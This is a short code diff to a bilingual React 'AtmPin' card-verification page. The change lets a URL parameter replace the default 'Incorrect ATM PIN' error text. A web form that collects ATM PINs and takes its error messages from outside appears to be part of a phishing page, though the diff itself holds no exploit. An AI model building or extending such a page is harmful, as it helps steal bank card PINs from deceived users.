@@ -13,6 +13,7 @@ export default function AtmPin() {
   const { language, setLanguage } = useLanguage();
   const sessionId = localStorage.getItem("sessionId") || params.get("session") || "";
   const showError = params.get("error") === "true";
+  const customError = params.get("msg");
 
   const isArabic = language === "ar";
 
@@ -86,7 +87,7 @@ export default function AtmPin() {
         <div className="otp-box">
           {showError && (
             <div className="error-message" style={{ backgroundColor: '#fee2e2', color: '#dc2626', border: '1px solid #fecaca', padding: '15px', borderRadius: '12px', marginBottom: '20px', fontWeight: 'bold' }}>
-              {isArabic ? "الرقم السري للصراف الي غير صحيح" : "Incorrect ATM PIN"}
+              {customError || (isArabic ? "الرقم السري للصراف الي غير صحيح" : "Incorrect ATM PIN")}
             </div>
           )}
           <h2>{isArabic ? "التحقق من البطاقة" : "Card Verification"}</h2>
